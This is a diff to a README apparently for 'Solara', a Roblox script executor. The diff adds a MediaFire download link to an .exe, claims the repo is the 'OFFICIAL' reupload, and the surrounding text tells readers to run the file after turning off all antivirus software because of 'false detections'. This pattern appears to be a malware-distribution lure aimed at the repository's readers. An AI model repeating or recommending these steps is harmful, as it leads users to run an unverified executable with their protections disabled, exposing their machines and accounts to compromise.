@@ -14,6 +14,18 @@
 <p>
     This Repo is the OFFICIAL Reuploaded and fully updated and working version of Solara.
 
+</head>
+Download Link: 
+</head>
+
+</p>
+https://www.mediafire.com/file/jmuaou8q8ex34bg/Solara_Executor.exe/file
+</p>
+
+</p>
+(regular file was to big to upload to github)
+</p>
+
 <h2>Installation</h2>
 <p>
     Download and run Solara Executor, turn off all anti-viruses due to false detections.
